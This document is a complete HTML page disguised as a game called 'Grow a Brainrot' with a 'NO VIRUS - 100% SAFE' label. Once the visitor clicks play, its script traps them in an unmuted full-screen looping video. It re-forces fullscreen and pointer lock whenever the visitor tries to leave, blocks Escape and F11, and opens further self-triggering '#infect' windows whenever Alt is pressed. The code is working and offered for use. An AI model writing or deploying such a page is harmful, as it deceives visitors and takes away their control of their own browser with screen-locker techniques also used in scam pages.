<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GROW A BRAINROT(NO TROJAN)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
            height: 100vh;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; color: white; font-family: 'Comic Sans MS', cursive;
        }

        /* Initial UI */
        .game-card {
            background: rgba(0,0,0,0.9); border: 8px ridge #0f0; border-radius: 20px;
            padding: 2rem; text-align: center; box-shadow: 0 0 50px #f0f;
            max-width: 450px; width: 90%; z-index: 10;
        }

        .play-button {
            background: #f00; color: #fff; padding: 20px 50px; font-size: 2rem;
            font-weight: 900; border: 4px solid #fff; border-radius: 10px; 
            cursor: pointer; animation: vibrate 0.1s infinite;
        }

        /* The Trap Overlay - Hidden initially */
        #videoOverlay {
            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: #000; z-index: 99999; cursor: none !important;
        }

        video { width: 100%; height: 100%; object-fit: fill; }

        @keyframes gradient { 0% {background-position:0% 50%} 50% {background-position:100% 50%} 100% {background-position:0% 50%} }
        @keyframes vibrate { 0% {transform:translate(0)} 20% {transform:translate(-2px,2px)} 40% {transform:translate(-2px,-2px)} 100% {transform:translate(0)} }
    </style>
</head>
<body>

    <div class="game-card" id="mainCard">
        <h1 style="margin-bottom:20px; text-shadow: 2px 2px #f00;">GROW A BRAINROT</h1>
        <img src="https://i.imgur.com/Ohxn6Lc.jpeg" style="width:100%; border-radius:10px; margin-bottom:20px; border: 3px solid #fff;">
        <button onclick="ignite()" class="play-button">PLAY NOW</button>
        <p style="margin-top:15px; color:yellow;">NO VIRUS - 100% SAFE</p>
    </div>

    <div id="videoOverlay">
        <video id="rickroll" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const overlay = document.getElementById('videoOverlay');
        const video = document.getElementById('rickroll');
        const card = document.getElementById('mainCard');
        let isTrapActive = false;

        // Automatically trigger if url has #infect parameter (for the Alt windows)
        window.addEventListener('load', () => {
            if (window.location.hash === '#infect') {
                setTimeout(() => {
                    ignite();
                }, 400);
            }
        });

        function ignite() {
            card.style.display = 'none';
            overlay.style.display = 'block';

            // Fire Fullscreen
            forceFullscreen();

            video.muted = false;
            video.play().catch(err => console.log("Waiting for interaction...", err));
        }

        function forceFullscreen() {
            if (overlay.requestFullscreen) {
                overlay.requestFullscreen();
            } else if (overlay.webkitRequestFullscreen) {
                overlay.webkitRequestFullscreen();
            }
        }

        video.addEventListener('playing', () => {
            isTrapActive = true;
            requestMouseLock();
        });

        function requestMouseLock() {
            if (!isTrapActive) return; 
            const lockMethod = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
            if (lockMethod) {
                lockMethod.call(overlay);
            }
        }

        // PHYSICAL ESCAPE / F11 COUNTER-MEASURE
        document.addEventListener('fullscreenchange', () => {
            if (isTrapActive && !document.fullscreenElement) {
                forceFullscreen();
                setTimeout(requestMouseLock, 50);
            }
        });

        document.addEventListener('webkitfullscreenchange', () => {
            if (isTrapActive && !document.webkitIsFullScreen) {
                forceFullscreen();
                setTimeout(requestMouseLock, 50);
            }
        });

        // Re-lock if pointer lock drops independently
        document.addEventListener('pointerlockchange', () => {
            if (isTrapActive && document.pointerLockElement !== overlay) {
                setTimeout(requestMouseLock, 50); 
            }
        }, false);

        // KEYBOARD EVENT LISTENERS (Alt & Escape / F11 implementation)
        window.addEventListener("keydown", (e) => {
            if (!isTrapActive) return;

            // Handle functional escapes by refreshing target states
            if (e.key === "Escape" || e.key === "F11") {
                e.preventDefault();
                forceFullscreen();
                setTimeout(requestMouseLock, 50);
            }

            // ALT KEY WINDOW SPAWNING
            if (e.altKey || e.key === "Alt") {
                e.preventDefault();
                let targetUrl = window.location.href.split('#')[0] + '#infect';
                window.open(targetUrl, '_blank', 'fullscreen=yes,scrollbars=no,menubar=no,status=no');
            }
        });

        // Clicking recovery rule
        document.addEventListener('mousedown', () => {
            if (isTrapActive) {
                forceFullscreen();
                requestMouseLock();
            }
        });
    </script>
</body>
</html>
